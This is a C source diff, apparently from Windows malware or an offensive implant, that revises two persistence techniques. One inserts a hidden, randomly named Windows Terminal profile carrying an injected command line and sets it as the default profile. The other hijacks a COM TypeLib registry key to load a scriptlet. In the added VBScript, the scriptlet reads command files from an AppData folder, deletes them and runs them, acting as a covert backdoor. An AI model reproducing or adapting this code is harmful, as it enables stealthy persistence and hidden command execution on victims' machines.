@@ -35,7 +35,7 @@ BOOL WTChangeSettingsFile
 	BOOL Result = FALSE;
 	DWORD dwInsertedPoint = 0;
 	LPSTR lpGuid = NULL;
-	CHAR szInsertedStr[0x400];
+	LPSTR lpInsertedStr = NULL;
 	DWORD cbInsertedStr = 0;
 	LPSTR lpDoulbeSlashPath = NULL;
 	LPSTR lpRandomStr = NULL;
@@ -54,11 +54,16 @@ BOOL WTChangeSettingsFile
 
 	lpDoulbeSlashPath = StrReplaceA(lpCommandLine, "\\", "\\\\", TRUE, 0);
 	lpRandomStr = GenRandomStr(6);
-	wsprintfA(szInsertedStr, "            {\n                \"commandline\": \"%s\",\n                \"guid\": \"%s\",\n                \"hidden\": true,\n                \"name\": \"%s\"\n            },\n", lpDoulbeSlashPath, lpGuid, lpRandomStr);
-
+	lpInsertedStr = DuplicateStrA("            {\n                \"commandline\": \"", 0);
+	lpInsertedStr = StrCatExA(lpInsertedStr, lpDoulbeSlashPath);
+	lpInsertedStr = StrCatExA(lpInsertedStr, "\",\n                \"guid\": \"");
+	lpInsertedStr = StrCatExA(lpInsertedStr, lpGuid);
+	lpInsertedStr = StrCatExA(lpInsertedStr, "\",\n                \"hidden\": true,\n                \"name\": \"");
+	lpInsertedStr = StrCatExA(lpInsertedStr, lpRandomStr);
+	lpInsertedStr = StrCatExA(lpInsertedStr, "\"\n            },\n");
 	dwInsertedPoint = StrStrA(lpJsonData, "\n    \"profiles\": \n") - lpJsonData + lstrlenA("\n    \"profiles\": \n");
 	dwInsertedPoint = StrStrA(lpJsonData + dwInsertedPoint, "\n        \"list\": \n        [\n") - lpJsonData + lstrlenA("\n        \"list\": \n        [\n");
-	lpNewJsonData = StrInsertA(lpJsonData, szInsertedStr, dwInsertedPoint);
+	lpNewJsonData = StrInsertA(lpJsonData, lpInsertedStr, dwInsertedPoint);
 	dwInsertedPoint = StrStrA(lpNewJsonData, "\n    \"defaultProfile\": \"") - lpNewJsonData + lstrlenA("\n    \"defaultProfile\": \"");
 	memcpy(lpNewJsonData + dwInsertedPoint, lpGuid, lstrlenA(lpGuid));
 	lpTemp = StrStrA(lpNewJsonData, "\n    \"startOnUserLogin\": ");
@@ -86,6 +91,7 @@ CLEANUP:
 	FREE(lpNewJsonData);
 	FREE(lpRandomStr);
 	FREE(lpJsonData);
+	FREE(lpInsertedStr);
 
 	return Result;
 }
@@ -170,24 +176,17 @@ BOOL PersistenceMethod2
 	CHAR szTypeLibPath[] = "SOFTWARE\\Classes\\TypeLib\\{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}";
 	LSTATUS Status = ERROR_SUCCESS;
 	HKEY hKey = NULL;
-	HKEY hTypeLibHkey = NULL;
+	HKEY hTypeLibHkey = NULL;	
 	HKEY hWin64 = NULL;
 	HKEY hWin32 = NULL;
 	HKEY hZero = NULL;
 	BOOL Result = FALSE;
-	CHAR szTemplate[] = "<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\">\n    </registration>\n    <script language=\"JScript\">\n        <![CDATA[\n            var WShell = new ActiveXObject(\"WScript.Shell\");\n            WShell.Run(\"%s\");\n        ]]>\n    </script>\n</scriptlet>";
 	LPSTR lpSctContent = NULL;
 	LPSTR lpSctPath = NULL;
 	LPSTR lpDefaultValue = NULL;
 	LPWSTR lpTempPath = NULL;
 	LPSTR lpReformatedCommand = NULL;
 	DWORD dwLastError = ERROR_SUCCESS;
-
-	Status = RegOpenKeyExA(HKEY_CURRENT_USER, szTypeLibPath, 0, KEY_READ, &hKey);
-	if (Status != ERROR_PATH_NOT_FOUND && Status != ERROR_FILE_NOT_FOUND) {
-		LOG_ERROR("RegOpenKeyExA", Status);
-		goto CLEANUP;
-	}
 
 	Status = RegOpenKeyExA(HKEY_CURRENT_USER, "SOFTWARE\\Classes\\TypeLib", 0, KEY_WRITE, &hKey);
 	if (Status != ERROR_SUCCESS) {
@@ -229,8 +228,9 @@ BOOL PersistenceMethod2
 	}
 
 	lstrcatA(lpSctPath, "\\log.sct");
-	lpSctContent = ALLOC(lstrlenA(szTemplate) + lstrlenA(lpReformatedCommand));
-	wsprintfA(lpSctContent, szTemplate, lpReformatedCommand);
+	lpSctContent = DuplicateStrA("<?xml version=\"1.0\"?>\n<scriptlet>\n    <registration\n        description=\"For Fun\"\n        progid=\"FORFUN\"\n        version=\"1.0\">\n    </registration>\n    <script language=\"VBScript\">\n        <![CDATA[\n            Dim fso\n            Dim LogiPath\n\n            Set fso = CreateObject(\"Scripting.FileSystemObject\")\n            Set WshShell = WScript.CreateObject(\"WScript.Shell\")\n            LogiPath = WshShell.ExpandEnvironmentStrings(\"%APPDATA%\\com.logi\")\n            If (fso.FolderExists(LogiPath)) Then\n                Set folder = fso.GetFolder(LogiPath)\n                Set files = folder.Files\n                RunCmd = 0\n                For each item In files\n                    fullName = LogiPath & \"\\\" & item.Name\n                    If InStr(item.Name, \".in\") <> 0 Then\n                        RunCmd = -1\n                        Set reader = fso.OpenTextFile(fullName, 1, True, 0)\n                        command = reader.ReadLine\n                        reader.Close\n                        fso.DeleteFile(fullName)\n                        WshShell.Run(command)\n                    End If\n                Next\n\n                If RunCmd = False Then\n                    WshShell.Run(\"", 0);
+	lpSctContent = StrCatExA(lpSctContent, lpReformatedCommand);
+	lpSctContent = StrCatExA(lpSctContent, "\")\n                End If\n            End If\n        ]]>\n    </script>\n</scriptlet>");
 	lpTempPath = ConvertCharToWchar(lpSctPath);
 	if (!WriteToFile(lpTempPath, lpSctContent, lstrlenA(lpSctContent))) {
 		goto CLEANUP;
